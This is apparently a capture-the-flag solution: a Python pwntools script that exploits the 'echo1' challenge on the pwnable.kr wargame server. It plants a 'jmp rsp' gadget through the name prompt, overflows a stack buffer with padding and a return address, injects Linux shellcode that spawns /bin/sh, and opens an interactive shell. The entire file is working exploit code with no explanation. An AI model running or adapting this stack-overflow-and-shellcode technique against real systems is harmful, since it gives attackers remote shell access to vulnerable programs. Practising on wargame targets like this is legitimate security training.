#!/usr/bin/env python3

import pwn

#io = pwn.process('./echo1')
io = pwn.remote('pwnable.kr', 9010)
elf = pwn.ELF('./echo1')
io.recvuntil('hey, what\'s your name? : ')

name = pwn.asm('jmp rsp', arch = 'amd64', os = 'linux')
io.sendline(name)
io.recvuntil('> ')
io.sendline(str(1))
io.recvuntil(name)

shellcode = pwn.shellcraft.amd64.linux.sh()
position = elf.sym[b'id']

payload = b'A' * 40 + pwn.p64(position) + pwn.asm(shellcode, arch = 'amd64', os = 'linux')
io.sendline(payload)
io.recvuntil(name)

io.interactive()
